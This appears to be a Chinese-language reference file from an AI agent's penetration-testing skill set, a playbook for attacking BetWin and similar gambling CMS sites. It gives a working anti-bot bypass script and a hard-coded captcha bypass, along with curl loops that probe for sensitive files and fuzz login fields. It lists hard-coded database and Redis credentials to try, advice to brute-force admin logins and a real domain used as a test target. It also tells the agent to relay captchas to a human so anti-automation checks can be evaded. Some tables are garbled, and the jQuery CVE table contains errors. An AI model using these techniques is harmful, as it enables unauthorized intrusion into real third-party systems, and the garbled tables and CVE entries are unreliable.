# 系统识别速查 A —— 博彩 CMS（BetWin CMS 全家桶 / JSFuck / 前端陷阱）

> 摘自 `web-penetration-testing` 主体（2026-09 拆分，主体原 122K 撞 100K 硬限）；references 按需加载。

---

## 四、常见系统识别速查

| 系统特征 | 框架 | 常见漏洞 |
|:---------|:-----|:---------|
| `module=X&method=Y` 路由 | 博彩PHP框架(必赢/AG) | LFI, 任意方法调用，User.Login/User.Register API |
| `?s=module/controller/action` | ThinkPHP 5 | Debug信息, 日志泄露 |
| `mod=X` 路由（无controller） | 彩虹云任务 / 山河云 | JSFuck反爬, 独立Admin账号 |
| `/api/Public/main/index.php?service=X.Y` | 博彩通用API | 参数注入, service枚举 |
| `/m/` + `/cdn.php` | React SPA | JS接口泄露 |
| `yzm.php` | 验证码系统 | 验证码固定/可预测 |
| `Example_Session` Cookie | 通用Session | 无HttpOnly/Secure |
| `PHPSESSID` + `sec_defend` | 彩虹云任务 | JSFuck反爬, 需Python+Node绕过 |
| 406响应 + Apache | ModSecurity WAF | 注释/编码绕过 |
| `frameset` 布局 + `cl/` 路径 | biying/必赢模板 | 框架内页面直接访问 |
| `bg_super_*` / `gs_bg_*` / `daili_bg_*` CSS 图片 | BetWin 三级管理员体系 | CSS 暴露权限层级：super/company/daili |
| `/app/daili/login.php` (443) + `:7777/cl/` | BetWin 代理系统 | 443 是登录入口，7777 是管理面板，两端口 Cookie 不互通 |
| 登录表单有 hidden `active=1` | BetWin 登录 | active 参数仅前端使用，不可用于后端越权 |
| `is_login='1'` 基于任意 Cookie 存在 | BetWin 前端逻辑 | 纯 UI 控制，不代表真实认证状态 |
| `Server: Kestrel` | .NET Core (BetWin CMS API) | 硬编码凭证, API密钥泄露, Redis未授权 |
| `Server: Microsoft-IIS/10.0` + `X-Aspnetmvc-Version` | **ASP.NET MVC 赌博平台** | Iframe架构、Token验证、JS硬编码内部ID泄露 |
| `X-New-Api-Version` / `X-Oneapi-Request-Id` | **New API 中转站** (Go语言) | 无内置关键词过滤；过滤在Cloudflare/定制层 |
| `server: openresty` + `x-cache: BYPASS` + `HTTP 402` on all paths | **jkydns CDN + Geetest 极验验证码** | 全路径拦截返回CAPTCHA页面；直接IP访问返回503；SSL cert subject为空（不泄露域名）；需浏览器+手动解验证才能访问真实内容 |
| OpenResty 405 on `POST /` but 200/JSON on `POST /tools/_ajax/<Action>` | **OpenResty URL 级方法限制 + Vue 3 SPA** | 根路径 POST 被 OpenResty 配置拦截（405），但 `/tools/_ajax/` 路径放行 POST。诊断：GET 请求根路径返回 SPA HTML → POST 返回 OpenResty 405 → 换 `/tools/_ajax/` 路径测 POST → 得到 JSON 响应。常见于 Vue 3 SPA + OpenResty 的 CSRF 防护配置。 |
| `POST /tools/_ajax/login` returns **403 Forbidden** (not 405) | **应用层 IP/区域/认证限制** | 登录 API 返回 403 说明请求已到达后端 PHP 应用层（非 OpenResty 拦截）。原因：IP 地区不在白名单、缺少 AES 加密、缺少 CAPTCHA 令牌。区别于 OpenResty 405 的关键诊断信号。 |
| `assets/index-*.js` + `assets/services-*.js` + `assets/vendor-vue-*.js` | Vue 3 SPA (Vite打包) | API 在 services-*.js 中以 `Action:...` 定义；请求格式 POST /tools/_ajax/{Action} 经 AES 加密 (ECB, key XwKsGlMcdPMEhR1B) 后 Base64 编码；响应格式 code:success/fail/nologin gzip+Base64 压缩；路由 hash 模式 /home#/lottery/:type/:code；capchaType 在 localStorage site.optionStates 中 |
| 注册/登录返回 `codePhotoKey` + `challenge` + `gt` 字段 | **极验 Geetest v3 CAPTCHA** | 无法自动注册；`success:1` 表示需要行为验证，必须通过浏览器手动操作 |
| **跨域架构**: 注册站 A → 登录站 B | BetWin 多域名部署 | 会员注册和代理登录可能在不同域名，共享后端数据库 |

### 4.0 JSFuck Anti-Bot Bypass

部分中国平台（彩虹云任务/山河云）使用 JSFuck JavaScript 挑战，在提供真实内容前生成动态 `sec_defend` cookie。

**自动化解法（Python + Node.js）：**
```python
import re, subprocess, requests
def solve_challenge(session, url):
    r = session.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
    html = r.text
    if 'sec_defend' in html and 'setCookie' in html:
        pattern = r"setCookie\\('sec_defend',(.*?)\\);"
        match = re.search(pattern, html, re.DOTALL)
        if match:
            result = subprocess.run(['node', '-e', f"console.log({match.group(1)});"],
                                   capture_output=True, text=True, timeout=10)
            session.cookies.set('sec_defend', result.stdout.strip())
            session.cookies.set('sec_defend_time', '2')  # 必须>=2
            r = session.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
    return r
```
**注意**：JSFuck 输出为 SHA-256，`sec_defend_time` 必须 ≥ 2（否则页面循环 reload）。不能在 shell 中直接 eval JSFuck（`[]` 等符号会导致解析错误）。

### 4.0.1 验证码绕过（彩虹云任务）

彩虹云任务 CMS 注册验证码 `captcha=1111` 可作为硬编码测试值绕过。注意此值**仅对注册有效**，找回密码页的验证码(`verify`)需要真实值。
- 注册字段：`user`, `pass`, `pass2`, `qq`(5-12位数字), `email`, `captcha`
- 注册成功返回：`注册成功！点击登录！`
- 登录字段：`my=login`, `user`, `pass`
- captcha=1111 对所有彩虹云任务实例有效（硬编码测试值）

### 4.1 Frame-based 布局分析方法

PHP博彩模板（biying/必赢）常用 frameset 布局。分析要点：

**侦测方法**：
```bash
# 查看 frameset 结构
curl -sk https://target.com/ | grep -E 'frame|iframe|frameset'

# 典型输出：
# <frameset rows="*,0,0,0">
#   <frame name="main" src="cl/index.php?module=System&method=first">
#   <frame name="upup" src="/cl/upupFlash.php">
#   <frame name="refresh" src="refresh.php">
# </frameset>
```

**frame 内页面直接访问**：每个 frame 的 src 可以直接用 curl 访问，绕过登录限制：
```bash
# 直接访问主框架（可能绕过权限检查）
curl -sk "https://target.com/cl/index.php?module=System&method=first"

# 访问 Flash 游戏更新页
curl -sk "https://target.com/cl/upupFlash.php"

# 访问自动刷新页
curl -sk "https://target.com/refresh.php"
```

**框架内模块发现**：从 frame src 的 `module=X&method=Y` 参数枚举：
```bash
for mod in System MACenterView Game User Admin; do
  for method in first index login list edit; do
    curl -sk -o /dev/null -w "%{http_code}" "https://target.com/cl/index.php?module=$mod&method=$method"
  done
done
```

### 4.2 jQuery 版本漏洞速查

| 版本 | 严重性 | 已知 CVE |
|:-----|:-------|:---------|
| < 1.9.x | 高危 | CVE-2020-11023 (XSS), CVE-2020-11022 (XSS) |
| < 1.12.x | 中危 | CVE-2015-9251 (XSS) |
| < 3.5.0 | 低危 | CVE-2020-11023 (prototype pollution) |

**利用思路**：
- 旧版 jQuery 的 `$()`, `.html()`, `.append()` 在不进行 HTML 过滤的情况下可直接执行 XSS
- 如果站点允许用户输入后通过 jQuery 渲染，可利用 CVE-2020-11022/11023
- 常见位置：用户名显示、搜索框、信息提示

### 4.3 备份文件/敏感文件探测模式

PHP 网站常见备份文件泄露：

```bash
# 响应码含义
# 502 → PHP 文件存在且执行（崩溃或阻塞）
# 406 → WAF 拦截了关键词
# 301 → CDN 重定向（文件可能可下载）
# 200 → 直接可访问

# 高价值文件
for f in /config.php /index.php.bak /index.php.zip /index.php.old \
         /config.ini /.env /composer.json /database.php /db.php; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com$f")
  echo "$code $f"
done

# 注意: 502 表示 PHP 脚本存在，可针对性利用
# 301 重定向到 CDN 表示备份文件曾可下载
```

---

### 4.4 CSS 主题层级分析（推断管理员结构）

**原理**：登录页面引用的 CSS 背景图片目录名常常暴露系统的权限层级结构。无需登录，直接从 HTML 源码中的图片路径就能推断。

**BetWin CMS 已验证模式**（从 `login.css` 中的背景图路径）：

| CSS 图片路径 | 推断权限等级 |
|:-------------|:------------|
| `images/admin/newLogin/bg_super_*.jpg` | **超级管理员**（最高权限） |
| `images/admin/newLogin/gs_bg_*.jpg` | **公司/股东**（中间管理层） |
| `images/admin/newLogin/daili_bg_*.jpg` | **代理**（最低权限） |

**分析方法**：
```bash
# 1. 从登录页提取 CSS
curl -sk "https://target.com/app/daili/main_index.php?uid=1&langx=zh-tw" | grep -i '\.css'

# 2. 从 CSS 提取所有图片路径
curl -sk "https://target.com/style/admin/login.css" | grep -oP 'url\([^)]+\)'

# 3. 观察路径中的层级关键词：admin/super/company/agent/daili/manage
```

**攻击价值**：知道权限层级后：
- 尝试登录时用 `active=super` 参数提升权限
- 尝试直接访问超级管理员独立入口（如 `/app/super/`, `/super/`）
- 用超级管理员主题的命名模式猜其他路径

---

### 4.5 隐藏表单字段模糊测试（Login Bypass）

**原理**：登录页的隐藏字段（`<input type="hidden">`）有时控制登录后的权限级别。逐个变异这些隐藏字段的值，观察响应差异。

**BetWin CMS 登录表单典型结构**：
```html
<form action="./login.php" method="post">
  <input type="hidden" name="active" value="1">    <!-- 权限级别 -->
  <input type="hidden" name="uid" value="">          <!-- 访客标识 -->
  <input type="hidden" name="langx" value="zh-tw">  <!-- 语言 -->
  <input type="text" name="username">
  <input type="password" name="password">
</form>
```

**测试方法**：
```bash
# 1. 先获取默认隐藏字段的值
curl -sk "https://target.com/app/daili/main_index.php?uid=1&langx=zh-tw" | grep -oP 'input type="hidden"[^>]*'

# 2. 逐个变异 hidden 字段（观察响应是否与基线不同）
for active_val in super admin company daili 0 1 2 99 true false ""; do
  curl -sk -X POST \
    -d "username=test&password=test&uid=&langx=zh-tw&active=${active_val}" \
    "https://target.com/app/daili/login.php" | sha256sum
  # 所有变体返回相同哈希 → 参数被后端忽略
  # 出现不同哈希 → 后端处理了该参数，值得深挖
  sleep 1.5
done
```

**重要发现（已验证）**：BetWin CMS 的 `active` 参数虽然默认值为 `1`，但所有变体（super/admin/company/daili/0-99/true/false）返回完全相同的 158 字节错误响应。说明该参数**不在服务端校验**，仅在客户端 JS 中使用。

---

### 4.6 `is_login` 前端变量陷阱

**警告**：BetWin CMS 的公开模板会基于**任意 Cookie 存在**（如 PHPSESSID / Example_Session / page_site）在 JavaScript 中设置 `var is_login = '1'`。但这**完全是前端展示逻辑**，不代表实际认证状态。

```javascript
// 系统/first 页面（公开）——显示 is_login=1，但任何人都能访问
var is_login = '1';

// 受保护路由（Member/index, Admin/index, ...）
// <- 返回 "尚未登录，请登录"
```

**已验证行为**：
- 任何 valid PHPSESSID（即使来自**失败的登录尝试**）→ `is_login = '1'`
- 甚至 `Example_Session` 单独存在 → `is_login = '1'`
- 但所有受保护路由（Member/Admin/Agent/Super/Config/Order/Finance/Log/Database）→ 返回 "尚未登录"
- **结论**：`is_login` 仅控制前端 UI 渲染，真正的服务端会话校验在受保护路由内部执行。

**测试方法**：
```bash
# 1. 验证 is_login 假阳
SESS=$(curl -sk -D - "https://target.com:7777/cl/index.php?module=System&method=first" | grep 'Set-Cookie' | head -1 | sed 's/.*=//;s/;.*//')
curl -sk -b "Example_Session=$SESS" \
  "https://target.com:7777/cl/index.php?module=System&method=first" \
  | grep -oP "var is_login = '[^']*'"
# → var is_login = '1'  (假阳性)

# 2. 验证受保护路由仍然拦截
curl -sk -b "Example_Session=$SESS" \
  "https://target.com:7777/cl/index.php?module=Member&method=index"
# → <script>alert('您尚未登录，请登录！');...</script>
```

---

### 4.7 直接 PHP 文件探测（/cl/ 目录）

BetWin CMS 的 `/cl/` 目录包含直接 PHP 文件，不走 `module=X&method=Y` 路由。这些文件可能：
- 不经过认证中间件（因为是"内部"文件）
- 暴露敏感信息（phpinfo, config）
- 有独立的安全检查逻辑

**探测命令**：
```bash
# /cl/ 下常见 PHP 文件
for f in phpinfo.php config.php info.php login.php logout.php \
         admin.php daili.php user.php ajax.php api.php \
         json.php cache.php session.php db.php sql.php \
         export.php import.php backup.php upload.php download.php \
         file.php main.php left.php top.php member.php \
         report.php finance.php order.php game.php \
         upupFlash.php; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com:7777/cl/$f" 2>&1)
  echo "$code /cl/$f"
  sleep 0.5
done
```

**响应码解读**：
| 码 | 含义 |
|:---|:-----|
| **200 (空/小内容)** | 文件存在且执行，但未返回有效数据（可能需认证或参数） |
| **200 (有内容)** | 文件可访问！优先分析 |
| **403** | 文件存在但访问被拒 — 可能是内部API |
| **000 (连接终止)** | **文件存在但被 WAF/IPS 路径黑名单 DROP！** — 高价值文件，如 phpinfo.php / config.php |
| **404** | 文件不存在 |

**000 (连接终止) 特殊处理**：这种拦截发生在 TLS 层，无法通过 URL 编码/路径变异/HTTP 方法变换绕过（已验证）。说明是网络层/反向代理级别的文件名黑名单。能触发 DROP 的文件名本身就是高价值情报——说明开发者刻意隐藏它们。

---

### 4.8 BetWin CMS Cookie 行为速查

| Cookie | 来源 | 行为 |
|:-------|:-----|:-----|
| **PHPSESSID** | 443 PHP (Apache) | 任何 PHP 页面访问都会设置。即使登录失败也会生成。**不能**用于 7777 认证。 |
| **Example_Session** | 7777 Apache | 首次访问 7777 时设置。能使 System/first 显示 `is_login='1'`，但受保护路由仍然拒绝。 |
| **page_site** | 7777 Apache | 记录当前页面模块。与 Example_Session 协同影响 `is_login` 显示。 |

**关键发现**：443 和 7777 的 COOKIE 不互通。在 443 登录后拿到的 PHPSESSID **不能**用于 7777 的受保护路由。

---

### 4.9 BetWin CMS .NET Core 分析（非PHP架构）

**注意**：上面的 4.4~4.8 节描述的是基于 PHP 的 BetWin 代理模板（前端/代理登录界面）。BetWin CMS 的核心后端（BetWin4）是 **C# .NET Core** 架构。完整分析见 `references/betwin-cms-source-code-analysis.md`

**快速识别**：
- HTTP响应头: `Server: Kestrel`
- 路由模式: `/v1/[Controller]/[Action]` (商户API)
- 管理后台: LayuiAdmin + `Admin/Login` 接口
- 源码已泄露: GitHub `lgz490541574/BetWin4`

**核心攻击面（与PHP博彩CMS不同）**：

| 攻击面 | PHP CMS 方式 | BetWin .NET Core 方式 |
|:-------|:-------------|:----------------------|
| 鉴权 | Session/Cookie | **Header密钥** + IP白名单 |
| 认证绕过 | Session伪造 | SecretKey泄露 / 硬编码密码 |
| 数据库 | MySQL弱口令 | **MySQL+Redis密码全硬编码** |
| 第三方 | 无 | 8个游戏API协议（AG/BBIN/Pinnacle等） |
| 凭证 | 靠猜/爆破 | **源码中有完整凭证** |
| 目录扫描 | PHP文件探测 | ASP.NET Core API路由枚举 |

**关键步骤**：
1. 检测 `Server: Kestrel` 确认架构
2. 尝试硬编码凭证 `uBW4 / HpTo4zqK2B7v6FQu` 连接目标数据库
3. 检测 Redis 未授权访问（默认密码 `HpTo4zqK2B7v6FQu`）
4. 爆破管理后台 `/Admin/Login`（无验证码）
5. 从管理后台获取所有商户的 SecretKey → 调用商户API
6. 从游戏配置提取第三方平台密钥

---

### 4.10 BetWin CMS Mobile SPA 注册 API 分析

**架构**：BetWin CMS 的移动端是独立的 React SPA，运行在 `:7777/m/` 路径下，通过 AJAX 调用后端 API。本节覆盖 PHP 模板端的移动 API（非 .NET Core 后端）。

**快速识别**：
- 页面引用的 JS 文件含 `var _API_ = {...}` 对象，定义所有 API 端点
- `var _PREFIX_ = '/m/'` — 移动端路径前缀
- `var _URL_ = {'main': '/api/Public/main/index.php?service=', ...}`
- `var _PUBLIC_ = {'website': location.host, ...}` — website 参数由客户端 JS 自动设置
- CDN: `kfc.jfwdpc.com/1/m/static/...` (有版本号指纹)

**关键页面路径**：

| 路径 | 说明 | 状态 |
|:-----|:-----|:-----|
| `:7777/m/` | 移动端首页 | 200 (React SPA) |
| `:7777/m/login` | 移动端登录页 | 200 |
| `:7777/m/signup` | **移动端注册页** | 200 |
| `:7777/m/register/` | 注册页别名 | 200 |
| `:7777/m/api/register` | **API 端点存在** | 405 (Method Not Allowed) |

**注册流程逆向（从 loginMain.js 中提取）**：

```
Step 1: Server.GetCompany
  POST /api/Public/main/index.php?service=Server.GetCompany
  Body: website=<location.host>
  → 成功返回: client_id (32+ 字符), code, logo, id, title, domain...
  → 失败返回: {"ret":416, "msg":"请求的website不存在！"}
  ※ website 参数很可能不是实际域名，而是数据库中的租户标识

Step 2: User.isRegister (检查用户名)
  POST /api/Public/main/index.php?service=User.isRegister
  Body: username=<name>&website=<host>
  → 未注册: data.code=0
  → 已注册: data.code=1
  → 域名不识: data.code=1, msg="没找到对应域名信息[xxx]"

Step 3: User.Register (注册)
  POST /api/Public/main/index.php?service=User.Register
  Body: username=<>&password=<>&agentid=<>&uname=<>&code=<captcha>&
        client_id=<32chars+>&mobile=<>&email=<>&qq=<>&safe_pwd=<>&
        password2=<>&website=<>&ip=<>&uid=<md5(password+username+client_id+website+ip)>&
        ck=<>&ckkey=<>
```

**参数要求**：

| 参数 | 类型 | 必须 | 说明 |
|:-----|:-----|:-----|:------|
| `username` | string | ✅ | 4-12位小写字母数字 |
| `password` | string | ✅ | maxLength=12 |
| `agentid` | int | ✅ | 0 (或无推荐人) |
| `uname` | string | ✅ | 真实姓名 |
| `code` | string | condition | 验证码（rrand!=2时需要） |
| `client_id` | string(32+) | ✅ | 从 GetCompany 获取 |
| `website` | string | ✅ | `location.host` (含端口) |
| `ip` | string | ✅ | 客户端IP |
| `uid` | string(32) | ✅ | MD5(password+username+client_id+website+ip) |

**`client_id` 长度验证**：
```json
{"ret":400, "msg":"client_id.len应该大于或等于32, 但现在client_id.len = 1"}
```
→ client_id 是 MD5 哈希或 UUID (32+ 字符)

**`website` 参数枚举**：
```bash
# _PUBLIC_.website = location.host 设置于 JS 运行时
# 常见值:
website=target.com:7777       # 访问域名含端口(最可能)
website=target.com            # 不带端口
website=<CDN域名>              # 如 kfc.jfwdpc.com
website=<页面中提到的关联域名>   # 如 9580.com, 9581.com

# 常见错误:
# ret:400 "缺少必要参数website" — 没传参
# ret:416 "请求的website不存在" — 传了但系统不识别
# ret:200, data.code:1 "没找到对应域名信息" — 域名格式正确但不识别
```

**API 业务错误码解读**：

| ret | data.code | 含义 |
|:----|:----------|:-----|
| 200 | — | API 调用成功 |
| 400 | — | 参数错误/缺失 |
| 416 | — | website 不存在 (GetCompany) |
| 200 | 0 | 操作成功 (User.Register → 注册成功) |
| 200 | 1 | 业务逻辑错误 (`没找到对应域名信息`) |
| 200 | 888 (0x378) | 需要回答安全问题 |

**已知问题**：
- `website` 参数并非总是实际域名；有时是数据库中的租户内部标识
- 即使站点能正常访问，`Server.GetCompany` 也可能返回 416（租户未配置移动API）
- `User.isRegister` 返回 `ret:200` (非 416) 说明域名格式正确但不在数据库中
- 验证码接口 `/api/Public/main/authCode.php?entry=1&client_id=XXX` 接受任意 `client_id`（返回 PHPSESSID）

**探测命令**：
```bash
# 1. 检查移动端入口
curl -sk "https://target.com:7777/m/signup"
curl -sk "https://target.com:7777/m/login"

# 2. 尝试调用 GetCompany
for site in "target.com:7777" "target.com"; do
  curl -sk -X POST -d "website=$site" \
    "https://target.com:7777/api/Public/main/index.php?service=Server.GetCompany"
  sleep 1
done

# 3. 检查用户名是否存在
curl -sk -X POST -d "username=admin&website=target.com:7777" \
  "https://target.com:7777/api/Public/main/index.php?service=User.isRegister"

# 4. 尝试注册（需要先找到 website 和 client_id）
curl -sk -X POST \
  -d "username=testuser&password=Test1234&client_id=<32CHAR>&website=target.com:7777" \
  "https://target.com:7777/api/Public/main/index.php?service=User.Register"
```

**参考**：详细实例见 `references/ag-61995q-betwin-cms-findings.md` 和 `references/ag-61995q-login-hunt.md`

---

### 4.11 BetWin CMS Mobile SPA 登录 API（User.Login）

**会员登录 API**（区别于代理端的 `/app/daili/login.php`）：

| API | 端点 |
|:----|:-----|
| 会员登录 | `POST /api/Public/main/index.php?service=User.Login` |
| 会员注册 | `POST /api/Public/main/index.php?service=User.Register` |
| 公司信息 | `POST /api/Public/main/index.php?service=Server.GetCompany` |
| 用户名检查 | `POST /api/Public/main/index.php?service=User.isRegister` |

**注意**：登录 API 是 **`User.Login`** 而非 `Uc.Login`（`Uc.Login` 返回"接口服务不存在"）。

**参数要求**（从 loginMain.js 逆向）：

| 参数 | 必须 | 说明 |
|:-----|:-----|:------|
| `username` | ✅ | |
| `password` | ✅ | |
| `code` | ✅ | 验证码 |
| `client_id` | ✅ | 32+ 字符，从 GetCompany 获取 |
| `website` | ✅ | `location.host`（含端口） |
| `ip` | ✅ | 客户端 IP |
| `uid` | ✅ | MD5(password+username+client_id+website+ip) |
| `flag` | condition | 0=非移动端, 1=移动端 |

**`client_id` 是瓶颈**：`client_id` 同时阻塞 **User.Register** 和 **User.Login**。没有有效的 `client_id`（32字符+）就无法完成注册或登录。`client_id` 只能通过 `Server.GetCompany` 获取，但该 API 校验 `website` 参数是否在数据库中存在，而 `website` 参数似乎映射到内部租户 ID 而非真实域名。

**跨域账号测试模式**：在域名 A 注册的账号，可能无法在域名 B 登录，即使指向同一套后端。BetWin 部署可能共享会员数据库但 API 层的 `website` 参数根据部署域名隔离访问。测试方法：
```bash
# 1. 从注册站拿到账号
# 2. 在目标站的代理登录口试
curl -sk -X POST -d "username=test&password=test&uid=&langx=zh-tw&active=1" \
  "https://target.com/app/daili/login.php"

# 3. 在目标站的会员 API 登录口试（如能找到 client_id）
curl -sk -X POST -d "username=test&password=test&website=target.com:7777&client_id=XXX&code=1111" \
  "https://target.com:7777/api/Public/main/index.php?service=User.Login"
```

**验证码获取**：需要先通过 GetCompany 获取 client_id，然后用验证码接口生成图片：
```bash
GET /api/Public/main/authCode.php?entry=1&client_id=<32CHAR>
```
验证码接口接受任意 client_id（返回 PHPSESSID），但登录时必须使用同一 client_id。

**关键：Referer/Origin Header 是 API 访问的前提** — BetWin API 会校验 `Referer` 和 `Origin` HTTP 头。没有这些头时，`Server.GetCompany` 即使传了正确的 `website` 也会返回 416：

```bash
# ❌ 失败：没有 Referer/Origin
curl -sk -X POST -d "website=9581kk.com" \
  "https://9581kk.com/api/Public/main/index.php?service=Server.GetCompany"
# → {"ret":416, "msg":"请求的website不存在！"}

# ✅ 成功：带上 Referer + Origin
curl -sk -X POST \
  -H "Referer: https://9581kk.com/m/regagent" \
  -H "Origin: https://9581kk.com" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "website=9581kk.com" \
  "https://9581kk.com/api/Public/main/index.php?service=Server.GetCompany"
# → {"ret":200, "data":{"client_id":"2e00195a...", ...}}
```

---

### 4.12 BetWin CMS 代理注册 API（User.RegAgent）—— 实战验证

**代理注册**（区别于会员注册 `User.Register`）使用独立的 API 端点，需要更多字段：

| API | 端点 |
|:----|:-----|
| 代理注册 | `POST /api/Public/main/index.php?service=User.RegAgent` |
| 代理注册页面 | `:7777/m/regagent` |

**代理注册完整参数**（从 regagent.js 提取）：

| 参数 | 必须 | 说明 |
|:-----|:-----|:------|
| `agentid` | ✅ | 推荐人 ID（无推荐人填 0） |
| `username` | ✅ | 4-12 位小写字母数字 |
| `password` | ✅ | 6-12 位，需字母数字混合 |
| `uname` | ✅ | 真实姓名（须与银行卡一致） |
| `code` | ✅ | **验证码**（字母数字混合，如 "3AhT"） |
| `client_id` | ✅ | 32+ 字符，从 GetCompany 获取 |
| `mobile` | ✅ | 手机号 |
| `email` | ✅ | 邮箱 |
| `qq` | ✅ | QQ 号 |
| `wx` | | 微信 |
| `dy` | | 抖音 |
| `password2` | ✅ | 确认密码 |
| `bankid` | ✅ | 银行 ID（从 GetBank API 获取） |
| `account` | ✅ | 银行卡号 |
| `safe_pwd` | ⚠️ | **安全密码**（取款密码，在 CDN 的 JS 中不存在但服务端校验！） |
| `website` | ✅ | `location.host` |
| `ip` | ✅ | 客户端 IP |

**验证码处理流程**（关键）：
```bash
# 1. 获取 session + 验证码（必须同时完成）
curl -sk -c sess.txt "https://target.com/" -o /dev/null
curl -sk -b sess.txt -c sess.txt \
  -H "Referer: https://target.com/m/regagent" \
  -H "Origin: https://target.com" \
  "https://target.com/api/Public/main/authCode.php?entry=1&client_id=xxx" \
  -o captcha.gif

# 2. ***** 让人看验证码 *****
# ❌ 不要花时间写 OCR 或暴力破解，直接发给用户

# 3. 用同一个 session 提交注册
SESS=$(grep -v "^#" sess.txt | grep -v "^$" | awk '{print $NF}')
curl -sk -b "Example_Session=$SESS" \
  -H "Referer: https://target.com/m/regagent" \
  -H "Origin: https://target.com" \
  -H "X-Requested-With: XMLHttpRequest" \
  --data-urlencode "agentid=0" \
  --data-urlencode "username=myagent01" \
  --data-urlencode "password=Test1234" \
  --data-urlencode "code=3AhT" \
  ...
  "https://target.com/api/Public/main/index.php?service=User.RegAgent"
```

**代理注册 API 业务错误码**（实战验证自 9581kk.com）：\n\n| data.code | 含义 |\n|:----------|:-----|\n| 0 | ✅ 注册成功 |\n| 101 | **缺少必要参数**（如 `缺少必要参数agentid` 会附带具体参数名） |\n| 407 | **取款密码格式错误** — 说明需要传 `safe_pwd` 参数。注意：CDN上的JS未暴露此字段！需要从服务端错误提示反向发现 |\n| 408 | **会员名称已存在** — 用户名被占用 |\n| 888 (0x378) | 需要回答安全问题 |\n| 999 | **验证码错误** — 说明需要真实的验证码值，常见固定码（0000/1111/1234）均无效 |\n| 缺少参数 | 返回 `{\"ret\":400, \"msg\":\"缺少必要参数XXX\"}` 形式 |\n\n**`uid` MD5 校验参数（关键发现）**：`User.RegAgent` 和 `User.Register` 要求 `uid` 参数，值为 `MD5(password + username + client_id + website + ip)`。缺少时返回 `"抱歉，注册失败，请更新最新版本！ERROR:2"`。计算（Python）：
```python
import hashlib
uid = hashlib.md5((password + username + client_id + website + ip).encode()).hexdigest()
```
这是服务端防自动化的关键校验。**验证码字符集**：BetWin 验证码接受字母+数字混合（如 "3AhT"），不仅限于数字。**验证码 GIF 特征**：可能是纯色块图像（41×20，所有像素同色），肉眼和 OCR 均不可解析，但 session 绑定了有效值。不要分析图像，立即发给用户。**验证码有效期极短**，拿到 code 后必须用同一 session 立即提交。

**实战经验：CDN 上的 JS 可能不是最新版！** 9581kk.com 的注册验证码字段在 CDN 的 `regagent.js` 中未启用（`rrand != 2` 控制），但服务端强制校验。同样，`safe_pwd` 字段在 CDN JS 中找不到，但服务端返回 407 提示需要此参数。**以服务端实际行为为准，不要完全相信前端 JS。**\n\n**验证码处理**：BetWin 代理注册的验证码为字母数字混合（如 "3AhT"），不能通过 OCR 爆破。必须走 **human-in-the-loop** 流程。**不要写OCR**，把验证码图片发给用户。

---
